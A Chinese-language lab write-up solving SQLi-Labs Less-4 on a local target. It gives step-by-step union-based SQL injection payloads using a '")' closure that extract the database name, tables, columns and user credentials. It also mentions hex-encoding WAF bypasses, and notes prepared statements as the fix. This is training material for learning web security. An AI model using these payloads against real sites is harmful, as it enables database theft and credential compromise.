SQLi-Labs Less-4

2026年9月25日 SQLi-Labs Web安全 SQL注入 双引号加括号闭合

一、题目信息

  • 题目名称：SQLi-Labs Less-4 (GET - Error based - Double Quotes - String)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 字符型联合注入（双引号+括号）
  • 靶场链接：http://localhost:8081/Less-4/（本地环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是双引号加括号闭合的字符型联合注入。后端 SQL 语句大概是 WHERE id = ("$id") LIMIT 0,1;。攻击者需要利用 ") 组合来闭合双引号和括号，再用 --+ 注释掉剩余的代码。

2. 怎么想（破题思路）

  • 访问页面，URL 为 ?id=1，页面正常。
  • 尝试 ?id=1"，页面报错，说明是双引号闭合。
  • 尝试 ?id=1") --+，页面回显正常，说明闭合成功。
  • 利用 order by 判断字段数（3列），用 union select 确定回显位（2和3）。
  • 通过 information_schema 系统表查库名、表名、列名，最后查数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：惯性思维使用单引号闭合

踩坑情况：由于连续做了前3关，惯性思维在 Less-4 里输入了 ?id=1' order by 3 --+，结果页面报错。

原因分析：Less-4 的后端代码包裹符号是双引号 "，不是单引号 '。

改进方式：把 Payload 里的单引号全部替换成双引号，变成 ?id=1" order by 3 --+，再结合括号，最终 Payload 为 ?id=1") order by 3 --+。

详细实操步骤（逐字解析）

第一步：爆出数据库名和版本

?id=-1") union select 1,database(),version() --+

逐字解析：" 闭合双引号，) 闭合括号。union select 联合查询。database() 回显 security，version() 回显 5.5.44。--+ 注释掉剩余代码。

第二步：爆出表名

?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

逐字解析：利用元数据表查表名，回显 emails,referers,uagents,users，锁定 users。

第三步：爆出字段名

?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

逐字解析：查 users 表的所有列名，回显 id,username,password。

第四步：爆出账号密码（图7）

?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+

逐字解析：0x3a 是冒号的十六进制，用于分隔账号和密码。from users 直接从表里查数据。回显 admin:admin 等。

4. 怎么迁移（跨领域联想）

  • API 接口测试：在 API 中，像 /api/users/(id) 这种带双引号和括号的路由参数，如果后端直接拼接 SQL，同样容易被 ") 闭合注入。
  • 安全开发（SDL）：无论 SQL 语句是单引号、双引号还是括号包裹，字符串拼接始终是万恶之源，必须使用预编译语句（Prepared Statement）。
  • 密码学与绕过：0x3a 这种十六进制表示法也是 WAF 绕过的常见技巧，利用编码差异绕过字符串匹配。

三、名词大全与原理深度复盘

1. 双引号+括号闭合

代码格式如 WHERE id = ("$id")。单引号闭合无效，必须用 ") 同时闭合双引号和括号。这属于字符型注入的另一个变种。

2. 联合查询（UNION）

用于合并两个 SELECT 的结果。前提是前后列数相同。常配合 -1 让原查询失效，以便回显注入的数据。

3. information_schema 数据库

MySQL 的元数据“户口本”，用来查库名、表名、列名，是 SQL 注入获取数据的必经之路。

4. group_concat() 函数

聚合函数，将多行结果合并成一行输出，避免页面只显示第一行。

5. 0x3a 十六进制

ASCII 码中冒号的十六进制表示，用于在联合查询中分割用户名和密码，方便阅读。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 的区别：Less-1 是单引号，Less-4 是双引号+括号。
  • 与 Less-3 的区别：Less-3 是单引号+括号，Less-4 是双引号+括号。本质是在测试不同的闭合字符组合。

2. 这种题目的出现原因

开发人员写 SQL 时，可能会随机使用单引号或双引号，并随意加上括号。这种杂乱的代码风格是 SQL 注入漏洞的温床。

3. 这种应用在实际中如何体现？

在真实渗透中，攻击者会针对不同的闭合方式构造特定的 Payload，最终通过 union select 拖库，或者写入 outfile 木马提权。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个上了双层锁的箱子：

  • Less-1（单引号锁）：只需单引号钥匙就能开。
  • Less-3（单引号+括号锁）：需要先解开括号，再用单引号钥匙。
  • Less-4（双引号+括号锁）：锁芯换成了双引号，你需要用 ") 组合钥匙来开。本质上都是打破程序预设的语法结构，注入恶意指令。
